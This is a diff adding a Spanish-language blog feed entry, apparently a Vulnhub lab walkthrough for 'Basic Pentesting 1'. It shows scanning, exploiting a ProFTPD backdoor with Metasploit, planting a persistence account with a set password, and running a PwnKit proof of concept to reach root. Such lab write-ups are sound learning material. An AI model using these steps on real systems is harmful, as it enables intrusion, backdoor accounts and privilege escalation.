@@ -13,6 +13,64 @@
 	</author>
 	
 	<entry>
+		<title>Vulnhub #0: CSEC Basic Pentesting 1</title>
+		<link href="https://update-me.com/posts/basic_pentesting_1/"/>
+		<updated>2025-05-10T00:00:00+00:00</updated>
+		<id>https://update-me.com/posts/basic_pentesting_1/</id>
+		<content type="html">
+		  &lt;p&gt;Puedes descargar la máquina vulnerable desde &lt;a href=&quot;https://www.vulnhub.com/entry/basic-pentesting-1,216/&quot;&gt;Vulnhub&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;descubrimiento-de-host&quot;&gt;Descubrimiento de host &lt;a class=&quot;direct-link&quot; href=&quot;#descubrimiento-de-host&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Usamos &lt;code&gt;sudo netdiscover&lt;/code&gt; para descubrir los host en la red.&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;Ubuntu:   192.168.0.20&lt;br&gt;Kali:     192.168.0.16&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;descubriendo-servicios-y-versiones&quot;&gt;Descubriendo servicios y versiones &lt;a class=&quot;direct-link&quot; href=&quot;#descubriendo-servicios-y-versiones&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Debemos identificar puertos, servicios y versiones de los mismos.&lt;/p&gt;
+&lt;p&gt;Usamos &lt;code&gt;nmap -sT -p- -A 192.168.0.26 -oA resultados&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;En los resultados encontramos algo de interés:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack ProFTPD 1.3.3c
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&quot;explotando-la-maquina&quot;&gt;Explotando la maquina &lt;a class=&quot;direct-link&quot; href=&quot;#explotando-la-maquina&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;h3 id=&quot;buscar-exploit&quot;&gt;Buscar exploit &lt;a class=&quot;direct-link&quot; href=&quot;#buscar-exploit&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Vamos a probar a romper &lt;code&gt;FTPd&lt;/code&gt; con &lt;code&gt;metasploit&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Podemos lanzar metasploit con &lt;code&gt;msfconsole&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Si buscamos exploits con &lt;code&gt;search proFTPd&lt;/code&gt; podemos encontrar una para nuestra version.&lt;/p&gt;
+&lt;h3 id=&quot;configuracion-del-exploit&quot;&gt;Configuracion del exploit &lt;a class=&quot;direct-link&quot; href=&quot;#configuracion-del-exploit&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Puedes usar &lt;code&gt;use unix/ftp/proftpd_133c_backdoor&lt;/code&gt; para usar este exploit, tambien puedes usar su index.&lt;/p&gt;
+&lt;p&gt;Con show options vemos que debemos indicar el &lt;code&gt;rhosts&lt;/code&gt;, &lt;code&gt;lhost&lt;/code&gt; y un &lt;code&gt;exploit target&lt;/code&gt; o payload a ejecutar.&lt;/p&gt;
+&lt;p&gt;Para ver los payloads disponibles &lt;code&gt;show payloads&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Para cargar un payload &lt;code&gt;set payload index|path&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Para configurar la maquina a atacar &lt;code&gt;set rhosts 192.168.0.26&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Para configurar que maquina se queda escuchando &lt;code&gt;set lhost 192.168.0.16&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Lanzamos con &lt;code&gt;run&lt;/code&gt;, deberíamos obtener acceso a una terminal, podemos comprobarlo con &lt;code&gt;whoami&lt;/code&gt; o &lt;code&gt;ls&lt;/code&gt;.&lt;/p&gt;
+&lt;h3 id=&quot;persistencia&quot;&gt;Persistencia &lt;a class=&quot;direct-link&quot; href=&quot;#persistencia&quot;&gt;#&lt;/a&gt;&lt;/h3&gt;
+&lt;p&gt;Podemos crear un usuario con &lt;code&gt;useradd hhyyppeerr&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Y crear una contraseña con &lt;code&gt;echo &amp;quot;hhyyppeerr:ilovesummer&amp;quot; | chpasswd&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Podemos comprobar que podemos entrar al sistema con &lt;code&gt;ssh hhyyppeerr@192.168.0.26&lt;/code&gt; e introduciendo &lt;code&gt;ilovesummer&lt;/code&gt; como contraseña.&lt;/p&gt;
+&lt;h2 id=&quot;weaponization-y-escalado-de-privilegios&quot;&gt;Weaponization y escalado de privilegios &lt;a class=&quot;direct-link&quot; href=&quot;#weaponization-y-escalado-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
+&lt;p&gt;Copiamos &lt;code&gt;linpeas&lt;/code&gt; o el script que queramos usar a la maquina objetivo con &lt;code&gt;scp ./linpeas.sh hhyyppeerr@192.168.0.26:/tmp/linpeas.sh&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Entramos de nuevo en la maquina objetivo con nuestro usuario y lanzamos el script.&lt;/p&gt;
+&lt;p&gt;Linpeas nos ha mostrado el siguiente exploit disponible:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;╔══════════╣ Executing Linux Exploit Suggester
+╚ https://github.com/mzet-/linux-exploit-suggester                                                                            
+[+] [CVE-2021-4034] PwnKit                                                                                                    
+
+   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
+   Exposure: probable
+   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
+   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Podemos buscar el CVE para encontrar exploits, en nuestro caso: &lt;a href=&quot;https://github.com/arthepsy/CVE-2021-4034&quot;&gt;https://github.com/arthepsy/CVE-2021-4034&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Nos copiamos el repositorio a la maquina objetivo con &lt;code&gt;nano&lt;/code&gt; o &lt;code&gt;scp&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Compilamos y ejecutamos el codigo:&lt;/p&gt;
+&lt;pre class=&quot;language-plaintext&quot;&gt;&lt;code class=&quot;language-plaintext&quot;&gt;$ ls&lt;br&gt;cve-2021-4034-poc.c  README.md&lt;br&gt;$ gcc cve-2021-4034-poc.c -o cve-2021-4034-poc&lt;br&gt;$ ls&lt;br&gt;cve-2021-4034-poc  cve-2021-4034-poc.c  README.md&lt;br&gt;$ ./cve-2021-4034-poc&lt;br&gt;# whoami&lt;br&gt;root&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Puede que esto no funcione, pero con &lt;code&gt;make&lt;/code&gt; si.&lt;/p&gt;
+
+			
+		</content>
+	</entry>
+	
+	<entry>
 		<title>Despliegue con HTTPS y Caddy</title>
 		<link href="https://update-me.com/posts/despliegue-caddy/"/>
 		<updated>2025-05-10T00:00:00+00:00</updated>
